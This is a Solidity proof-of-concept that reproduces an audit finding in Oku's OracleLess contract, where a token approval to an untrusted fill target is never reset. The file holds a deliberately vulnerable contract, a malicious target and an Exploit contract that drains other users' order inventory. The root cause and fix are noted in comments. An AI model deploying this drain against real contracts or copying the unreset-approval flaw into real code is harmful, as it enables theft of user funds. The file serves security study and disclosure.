// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Oku — Failure to reset unspent approval to the target address will lead
    to the wiping of the smart contract balance
    (Sherlock 2024-11-oku, #44376, H-6)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The
    vulnerable OracleLess.execute body is reduced with the blamed
    approval line preserved: approval is granted to an untrusted target and
    NEVER reset to zero after the call. A malicious fill target spends 1 wei
    of tokenIn and returns 1 wei of tokenOut; leftover allowance is then
    drained against other pending orders' inventory (no fork, no cheats).
//////////////////////////////////////////////////////////////////////////*/

/*//////////////////////////////////////////////////////////////
    Root cause: after `target.call(txData)`, remaining tokenIn allowance is
    not set back to 0. The order creator is refunded unspent tokenIn, so the
    target keeps a large residual allowance against the vault's inventory of
    other users' pending orders.

    Recommended fix (per report): `order.tokenIn.safeApprove(target, 0);`
    immediately after the external call.
//////////////////////////////////////////////////////////////*/

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

/// @dev Minimal ERC20 used as both tokenIn and tokenOut.
contract MockToken {
    string public name = "Mock";
    string public symbol = "MCK";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allow");
        require(balanceOf[from] >= amount, "bal");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Reduced OracleLess — only the blamed execute() path.
contract OracleLess {
    struct Order {
        IERC20 tokenIn;
        IERC20 tokenOut;
        uint256 amountIn;
        uint256 minAmountOut;
        address recipient;
    }

    mapping(uint96 => Order) public orders;
    mapping(uint96 => bool) public filled;
    uint96 public nextOrderId = 1;

    error TransactionFailed(bytes reason);

    function createOrder(
        IERC20 tokenIn,
        IERC20 tokenOut,
        uint256 amountIn,
        uint256 minAmountOut,
        address recipient
    ) external returns (uint96 orderId) {
        require(tokenIn.transferFrom(msg.sender, address(this), amountIn), "pull");
        orderId = nextOrderId++;
        orders[orderId] = Order(tokenIn, tokenOut, amountIn, minAmountOut, recipient);
    }

    function fillOrder(uint96 orderId, address target, bytes calldata txData) external {
        require(!filled[orderId], "filled");
        Order memory order = orders[orderId];
        (uint256 amountOut, uint256 tokenInRefund) = execute(target, txData, order);
        filled[orderId] = true;

        // Refund unspent tokenIn to the order recipient (as real code does).
        if (tokenInRefund > 0) {
            require(order.tokenIn.transfer(order.recipient, tokenInRefund), "refund");
        }
        // Deliver tokenOut to recipient.
        if (amountOut > 0) {
            require(order.tokenOut.transfer(order.recipient, amountOut), "out");
        }
    }

    /// @dev VERBATIM reduction of OracleLess.execute
    ///      (oku-custom-order-types/contracts/automatedTrigger/OracleLess.sol).
    function execute(
        address target,
        bytes calldata txData,
        Order memory order
    ) internal returns (uint256 amountOut, uint256 tokenInRefund) {
        //update accounting
        uint256 initialTokenIn = order.tokenIn.balanceOf(address(this));
        uint256 initialTokenOut = order.tokenOut.balanceOf(address(this));

        //approve
        order.tokenIn.approve(target, order.amountIn); // @> VULN: approval granted to untrusted target and NEVER reset to 0 after the call
        // FIX: after the call below, order.tokenIn.approve(target, 0);

        //perform the call
        (bool success, bytes memory reason) = target.call(txData);

        if (!success) {
            revert TransactionFailed(reason);
        }

        // MISSING: order.tokenIn.approve(target, 0);

        uint256 finalTokenIn = order.tokenIn.balanceOf(address(this));
        require(finalTokenIn >= initialTokenIn - order.amountIn, "over spend");
        uint256 finalTokenOut = order.tokenOut.balanceOf(address(this));

        require(
            finalTokenOut - initialTokenOut > order.minAmountOut,
            "Too Little Received"
        );

        amountOut = finalTokenOut - initialTokenOut;
        tokenInRefund = order.amountIn - (initialTokenIn - finalTokenIn);
    }
}

/// @dev Malicious fill target: spends 1 wei of tokenIn, returns 1 wei of tokenOut,
///      then later drains residual allowance against the vault.
contract MaliciousTarget {
    IERC20 public tokenIn;
    IERC20 public tokenOut;

    constructor(IERC20 _tokenIn, IERC20 _tokenOut) {
        tokenIn = _tokenIn;
        tokenOut = _tokenOut;
    }

    fallback() external payable {
        // Spend only 1 wei of the approved amount; leave almost all allowance.
        tokenIn.transferFrom(msg.sender, address(this), 1);
        tokenOut.transfer(msg.sender, 1);
    }

    function spendAllowance(address victim, address to, uint256 amount) external {
        tokenIn.transferFrom(victim, to, amount);
    }
}

/// @dev Simple receiver used as the profit sink (attacker).
contract Receiver {
    // holds stolen ERC20
}

/// @notice Orchestrator — deploys everything; run() performs the attack.
/// CREATE order: (1) tokenIn (2) tokenOut (3) oracleLess (4) target (5) attacker
contract Exploit {
    MockToken public tokenIn;       // CREATE nonce 1
    MockToken public tokenOut;      // CREATE nonce 2
    OracleLess public oracleLess;   // CREATE nonce 3 — vulnerable
    MaliciousTarget public target;  // CREATE nonce 4
    Receiver public attacker;       // CREATE nonce 5 — profit receiver

    uint256 public constant VICTIM_AMOUNT = 100 ether;
    uint256 public constant ATTACKER_AMOUNT = 100 ether;

    constructor() {
        tokenIn = new MockToken();
        tokenOut = new MockToken();
        oracleLess = new OracleLess();
        target = new MaliciousTarget(IERC20(address(tokenIn)), IERC20(address(tokenOut)));
        attacker = new Receiver();
    }

    function run() external {
        // Seed: mint inventory + attacker fill capital + 1 wei tokenOut for the target.
        tokenIn.mint(address(this), VICTIM_AMOUNT + ATTACKER_AMOUNT);
        tokenOut.mint(address(target), 1);

        // Victim places a large pending order — inventory sits in oracleLess.
        tokenIn.approve(address(oracleLess), VICTIM_AMOUNT);
        oracleLess.createOrder(
            IERC20(address(tokenIn)),
            IERC20(address(tokenIn)),
            VICTIM_AMOUNT,
            9 ether,
            address(0xA11CE)
        );

        // Attacker creates an order and fills it with the malicious target.
        uint256 attackerBefore = tokenIn.balanceOf(address(attacker));
        tokenIn.approve(address(oracleLess), ATTACKER_AMOUNT);
        uint96 attackerOrder = oracleLess.createOrder(
            IERC20(address(tokenIn)),
            IERC20(address(tokenOut)),
            ATTACKER_AMOUNT,
            0, // amountOut must be > 0; 1 wei from the target satisfies this
            address(attacker)
        );

        // Fill: target spends 1 wei, leaves residual allowance of ~ATTACKER_AMOUNT - 1.
        oracleLess.fillOrder(attackerOrder, address(target), "");

        uint256 leftover = tokenIn.allowance(address(oracleLess), address(target));
        require(leftover >= VICTIM_AMOUNT - 1, "residual allowance missing");

        // Drain the vault's inventory (victim's pending order) via leftover approval.
        target.spendAllowance(address(oracleLess), address(attacker), leftover);

        uint256 attackerAfter = tokenIn.balanceOf(address(attacker));
        // Attacker receives: (1) tokenIn refund of ~ATTACKER_AMOUNT-1 from their own fill,
        // (2) leftover drained from vault (~ATTACKER_AMOUNT-1 of residual + victim inventory
        // capped by leftover). Net: attacker nearly doubles vs their 100e18 outlay.
        require(attackerAfter > attackerBefore, "no profit");
        require(
            attackerAfter - attackerBefore >= VICTIM_AMOUNT - 2,
            "did not wipe vault inventory"
        );
    }
}
